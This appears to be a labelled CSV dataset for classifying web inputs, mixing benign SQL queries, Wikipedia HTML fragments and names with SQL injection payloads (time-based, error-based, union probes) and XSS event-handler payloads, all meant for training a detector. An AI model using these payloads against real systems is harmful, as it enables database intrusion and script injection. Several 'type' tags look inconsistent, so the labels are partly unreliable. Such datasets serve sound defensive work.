Text,Label,type
"  SELECT * FROM given WHERE good IN  ( 'halfway', 'enemy', 'driven' )  ",0,sql
gaylord,0,sql
SELECT TOP 3 * FROM limited SELECT * FROM wave 3SELECT * FROM cent,0,sql
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=47"" title=""Edit section: Art"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
SELECT * FROM wing WHERE sound = 'depth'  OR body = 'raw',0,sql
"<cite onkeyup=""alert(1)"" contenteditable>test</cite>",2,xss
"1%'  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,sql
-4325 order by 1--,1,xss
3.79218E+15,0,xss
"-8200' where 3422  =  3422 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,sql
"   SELECT girl,horn,round,honor,like     (  (  course JOIN he ON slight.arrow =  general.motor )   INNER JOIN frogON Orders.cause =  somebody.ridingID ) ",0,xss
"<li><a href=""/wiki/Solipsism"" title=""Solipsism"">Solipsism </a> </li>",0,xss
SELECT * FROM there WHERE NOT past = 'purpose'  AND NOT principal = 'secret',0,xss
"-5425 where 5933  =  5933 union all select 5933,5933,5933--",1,sql
37766,0,sql
"1%""   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""%""  =  """,1,xss
quintanilla del coco,0,xss
"<label draggable=""true"" ondragend=""alert(1)"">test</label>",2,xss
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",1,sql
"-6084'   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'dfcp'  =  'dfcp",1,xss
"calle licurgo, 39",0,sql
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367537 ) ,0,sql
select   (  case when   (  3676  =  8635  )   then 3676 else 1/  (  select 0  )   end  )  --,1,sql
SELECT * FROM matter,0,sql
<iframe onpointerleave=alert(1)>XSS</iframe>,2,xss
 UPDATE everybody SET wise = 'rapidly'WHERE discover = 'pattern',0,sql
8217,0,sql
booth,0,sql
SELECT COUNT ( he )  FROM clothing,0,sql
"<output oncontextmenu=""alert(1)"">test</output>",2,xss
"SELECT * FROM exchange WHERE best BETWEEN ""taught"" AND    ""involved""",0,xss
"<br onbeforecopy=""alert(1)"" contenteditable>test</br>",2,xss
	 </span> </h4>,0,xss
"<optgroup onmouseover=""alert(1)"">test</optgroup>",2,xss
"<command onbeforecut=""alert(1)"" contenteditable>test</command>",2,xss
"1%""   )    )     )   union all select null,null,null,null--",1,sql
 </li>,0,xss
"   SELECT book,wool,available,middle,lesson     (  (  money JOIN composition ON refused.scientific =  wherever.onto )   INNER JOIN baseballON Orders.mainly =  took.indicateID ) ",0,sql
SELECT * FROM forth WHERE lay = 'along'  OR diagram = 'rich',0,sql
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,1,sql
"1%"" and 6408  =  7959--",1,sql
" SELECT swung, desertFROM by",0,sql
SELECT * FROM list WHERE tin = 'toy',0,sql
<tbody id=x tabindex=1 ondeactivate=alert(1)></tbody><input id=y autofocus>,2,xss
" select * from users where id  =  1 + @<@# union select null,version  (    )   -- 1",1,sql
SELECT * FROM difference 3 SELECT * FROM snow,0,sql
SELECT * FROM iron WHERE trail  BETWEEN 10 AND 20,0,sql
SELECT * FROM sharp WHERE cool = 'start' LIMIT 3,0,sql
1'  )   rlike sleep  (  5  )   and   (  'tslp'  =  'tslp,1,sql
SELECT although ( s )  FROM diagram UNION,0,xss
"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'fbsi' like 'fbsi",1,sql
"<multicol onbeforecopy=""alert(1)"" contenteditable>test</multicol>",2,xss
"-8256""   )    )     )   or 6872  =  6872 and    (    (     (  ""lrtu""  =  ""lrtu",1,sql
<u onblur=alert(1) tabindex=1 id=x></u><input autofocus>,2,xss
SELECT around ( s FROM former RIGHT JOIN,0,sql
41713468r,0,sql
betty,0,sql
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/signals.html"">Signals</a></li>",0,xss
"-1988 where 4597  =  4597 union all select 4597,4597,4597,4597,4597,4597--",1,xss
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 11514 )  ORDER BY meta_id ASC",0,sql
24596413y,0,sql
casas de miravete,0,xss
"  SELECT bowID AS ID, wheat AS flower FROM park",0,sql
mallo etchart,0,sql
<nobr id=x tabindex=1 ondeactivate=alert(1)></nobr><input id=y autofocus>,2,xss
or true--,1,sql
"1"" where 9172  =  9172 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,sql
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Cell&amp;rft.atitle=Identifying+Medical+Diagnoses+and+Treatable+Diseases+by+Image-Based+Deep+Learning&amp;rft.volume=172&amp;rft.issue=5&amp;rft.pages=1122-1131.e9&amp;rft.date=2018&amp;rft_id=info%3Adoi%2F10.1016%2Fj.cell.2018.02.010&amp;rft_id=info%3Apmid%2F29474911&amp;rft.aulast=Kermany&amp;rft.aufirst=D&amp;rft.au=Goldbaum%2C+M&amp;rft.au=Zhang%2C+Kang&amp;rft_id=https%3A%2F%2Fwww.cell.com%2Faction%2FcaptchaChallenge%3FredirectUri%3D%252Fcell%252Fpdf%252FS0092-8674%252818%252930154-5.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"	<span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
"1  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1,sql
1'||  (  select 'qdkb' where 4331  =  4331,1,sql
"   SELECT caught, win+ ', ' + seed+ ' ' + machinery+ ', ' + floor AS waste  FROM consider",0,sql
"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",1,sql
SELECT * FROM arm WHERE tired NOT BETWEEN 'hold' AND 'twice',0,sql
"	 <div class=""thumbinner"" style=""width:222px;""><a href=""/wiki/File:ParticleSwarmArrowsAnimation.gif"" class=""image""><img alt="""" src=""//upload.wikimedia.org/wikipedia/commons/thumb/e/ec/ParticleSwarmArrowsAnimation.gif/220px-ParticleSwarmArrowsAnimation.gif"" decoding=""async"" width=""220"" height=""165"" class=""thumbimage"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/e/ec/ParticleSwarmArrowsAnimation.gif/330px-ParticleSwarmArrowsAnimation.gif 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/e/ec/ParticleSwarmArrowsAnimation.gif/440px-ParticleSwarmArrowsAnimation.gif 2x"" data-file-width=""560"" data-file-height=""420"" /> </a>  <div class=""thumbcaption"">",0,xss
"1""   )    )     )   and 4124  =  7245 and    (    (     (  ""tuom""  =  ""tuom",1,sql
begin dbms_lock.sleep  (  5  ) ,1,sql
select sleep  (  5  )  -- waln,1,sql
"  SELECT * FROM race WHERE large IN  ( 'come', 'adjective', 'successful' )  ",0,sql
"<A HREF=""http://google:ha.ckers.org""></A>",2,xss
condemios de arriba,0,sql
"	 </span>It's able to create knowledge itself': Google unveils AI that learns on its own"" </a>. <i>the Guardian </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">7 May ",0,xss
"   SELECT grade, letter, caveFROM being WHERE arrange  IS NOT NULL",0,sql
<listing id=x tabindex=1 ondeactivate=alert(1)></listing><input id=y autofocus>,2,xss
1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,sql
<time onblur=alert(1) tabindex=1 id=x></time><input autofocus>,2,xss
SELECT * FROM slight WHERE    NOT tales = 'arrive',0,xss
SELECT AVG ( range ) FROM position SELECT SUM ( silver ) ,0,sql
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,1,sql
"<style>:target {color: red;}</style><ol id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></ol>",2,xss
"1' union all select null,null,null,null,null,null,null--",1,sql
"<img draggable=""true"" ondrag=""alert(1)"">test</img>",2,xss
4.62514E+14,0,sql
	 </span>,0,xss
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=Kismet&amp;rft.pub=MIT+Artificial+Intelligence+Laboratory%2C+Humanoid+Robotics+Group&amp;rft_id=http%3A%2F%2Fwww.ai.mit.edu%2Fprojects%2Fhumanoid-robotics-group%2Fkismet%2Fkismet.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
chuck,0,sql
SELECT * FROM hidden FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM fifth,0,sql
"<ul onbeforepaste=""alert(1)"" contenteditable>test</ul>",2,xss
"<div role=""note"" class=""hatnote navigation-not-searchable"">Further information: <a href=""/wiki/Technological_unemployment#21st_century"" title=""Technological unemployment"">Technological unemployment §&#160;21st century </a> </div>",0,xss
9491,0,sql
"1 union all select null,null,null,null,null,null,null,null#",1,sql
 UPDATE cost SET cat = 'discuss'WHERE today = 'dig',0,sql
<title onblur=alert(1) tabindex=1 id=x></title><input autofocus>,2,xss
"  SELECT DAYOFWEEK ( ""2017-06-15"" ) ;",0,xss
1'  )   where 9272  =  9272,1,sql
"1""   )    )     )   and 7533  =  7533 and    (    (     (  ""alvd"" like ""alvd",1,sql
"1'   )    )    as kpdl where 4443  =  4443 union all select null,null,null,null,null,null--",1,sql
calle villa de andorra 36 9?b,0,sql
SELECT * FROM fairly WHERE apartment = 'mine'  AND City = 'well',0,sql
" select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",1,xss
"<col oncut=""alert(1)"" contenteditable>test</col>",2,xss
SELECT * FROM bit WHERE voice = 'golden' FETCH FIRST 3 ROWS ONLY,0,sql
SELECT MIN ( ready )  AS pleasant FROM state,0,sql
c63en13759,0,sql
SELECT COUNT ( empty )  FROM creature,0,sql
1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,sql
"1'   )    )    as wves where 2641  =  2641 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,sql
SELECT AVG ( Price ) FROM safe,0,sql
"<style>@keyframes x{}</style><wbr style=""animation-name:x"" onanimationend=""alert(1)""></wbr>",2,xss
"   SELECT COUNT ( blanket ) , took FROM none BY seat",0,sql
"<style>@keyframes slidein {}</style><option style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></option>",2,xss
"1%'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  '%'  =  '",1,xss
"1'||  (  select 'wvio' from dual where 8934  =  8934 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,sql
zoq3et1r8,0,xss
SELECT * FROM fruit WHERE NOT recall = 'wheel'  AND NOT breathing = 'team',0,sql
"<meta content=""&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)"" http-equiv=""refresh""/>",2,xss
SELECT * FROM task FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM whistle,0,sql
" select * from users where id  =  1 or 1#""@ union select 1,version  (    )   -- 1",1,xss
end and 'aenf'  =  'aenf,1,sql
SELECT AVG ( shirt ) FROM cave,0,xss
<image srcset=1 onerror=alert(1)>,2,xss
4.13841E+15,0,sql
d2sa2uer5o,0,sql
0r90di89r,0,sql
SELECT interest ( s )  FROM still,0,sql
"<style>:target {color:red;}</style><tbody id=x style=""transition:color 1s"" ontransitionend=alert(1)></tbody>",2,xss
"1""  )   as eibf where 5026  =  5026 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1,sql
"1'  )   and elt  (  4249  =  4249,7259  )   and   (  'bxnn'  =  'bxnn",1,sql
brockie,0,sql
"""a"""" or 3  =  3--""",1,sql
"1"" and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""wtkx""  =  ""wtkx",1,sql
	 </span> ,0,xss
SELECT * FROM hand WHERE garage = 'fierce',0,sql
1'+  (  select nsri where 1202  =  1202 and 4595  =  4595#,1,xss
"cabaeros, 131",0,sql
<article onpointerdown=alert(1)>XSS</article>,2,xss
"-2028'   )    )     )   union all select 8698,8698,8698,8698#",1,sql
watanabe,0,sql
"<title oncopy=""alert(1)"" contenteditable>test</title>",2,xss
"1""  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""zyeo"" like ""zyeo",1,sql
"1""  )   where 4878  =  4878 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --",1,xss
"<li id=""cite_note-60""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-60"">^ </a> </b> ",0,xss
yern,0,sql
"<style>:target {color: red;}</style><source id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></source>",2,xss
-3867%'  )   or 3084  =  5633 and   (  '%'  =  ',1,sql
"<li class=""toclevel-2 tocsection-42""><a href=""#Video_games""><span class=""tocnumber"">7.7 ",0,xss
"<li><a href=""/wiki/Virtual_reality"" title=""Virtual reality"">Virtual reality </a> </li>",0,xss
SELECT mostly FROM expect UNION ALL SELECT related FROM finish ORDER BY pipe,0,sql
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=AI%4050%3A+AI+Past%2C+Present%2C+Future&amp;rft.place=Dartmouth+College&amp;rft.date=2006&amp;rft.aulast=Maker&amp;rft.aufirst=Meg+Houston&amp;rft_id=http%3A%2F%2Fwww.engagingexperience.com%2F2006%2F07%2Fai50_ai_past_pr.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"1%'  )   union all select null,null,null,null--",1,xss
SELECT * FROM  ( SELECT religious FROM coast ) ,0,sql
SELECT FLOOR ( 25.75 ) ;,0,sql
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;885–892 </li> </ul>",0,xss
"<option onbeforepaste=""alert(1)"" contenteditable>test</option>",2,xss
	 </span>,0,xss
"1%""  )   union all select null,null,null,null--",1,sql
-7786'   )    )    or 9323  =  9323#,1,sql
"-3769""   )    )     )   union all select 8456#",1,sql
bancalero,0,sql
"   SELECT COUNT ( what ) , everybody FROM lot BY meant",0,sql
"SELECT NULLIF ( ""Hello"", ""world"" ) ;",0,sql
<svg><strike onload=alert(1)></strike>,2,xss
SELECT AVG ( for ) FROM verb SELECT SUM ( drink ) ,0,sql
"  SELECT curiousID AS ID, decide AS led FROM save",0,sql
select   (  case when   (  9246  =  6326  )   then 9246 else 9246*  (  select 9246 from mysql.db  )   end  )  #,1,sql
"<article onbeforecopy=""alert(1)"" contenteditable>test</article>",2,xss
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  '%'  =  '",1,sql
SELECT TOP 3 * FROM roof SELECT * FROM hand 3SELECT * FROM sail,0,sql
"<i onbeforecopy=""alert(1)"" contenteditable>test</i>",2,xss
SELECT entire ( s )  FROM completely LEFT JOIN,0,xss
narrillos del lamo,0,xss
"-6523"" or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""bwrb"" like ""bwrb",1,sql
"1""   )    )    as hfma where 2654  =  2654 and make_set  (  8403  =  8403,8899  )  --",1,xss
SELECT TOP 3 * FROM activity,0,sql
SELECT AVG ( indicate ) FROM composed SELECT SUM ( forty ) ,0,sql
"<nav onkeydown=""alert(1)"" contenteditable>test</nav>",2,xss
SELECT COUNT ( tobacco )  FROM behind,0,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28705 )  ORDER BY meta_id ASC",0,sql
"-1065   )    )    union all select 7437,7437,7437,7437,7437,7437,7437,7437--",1,sql
SELECT * FROM promised FETCH FIRST 3 ROWS ONLY,0,sql
<header onpointerenter=alert(1)>XSS</header>,2,xss
"<style>:target {color: red;}</style><spacer id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></spacer>",2,xss
"<style>:target {color: red;}</style><abbr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></abbr>",2,xss
2.25315E+15,0,sql
SELECT COUNT ( air ) FROM attempt,0,sql
	 </span>,0,xss
"<title oncontextmenu=""alert(1)"">test</title>",2,xss
SELECT sat FROM pink UNION ALL SELECT brother FROM little ORDER BY wore,0,sql
"<dt><a class=""reference internal"" href=""topics/debug.html""><span class=""doc"">Debugging Spiders",0,xss
1'   )    )    as wjfj where 3802  =  3802,1,sql
"1'   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'fgox' like 'fgox",1,sql
8352,0,sql
bscones de ojeda,0,sql
<section onfocusout=alert(1) tabindex=1 id=x></section><input autofocus>,2,xss
DELETE FROM greatest,0,sql
85744372g,0,sql
SELECT * FROM rubbed,0,sql
SELECT * FROM student WHERE replace  BETWEEN 10 AND 20,0,sql
<u id=x tabindex=1 onactivate=alert(1)></u>,2,xss
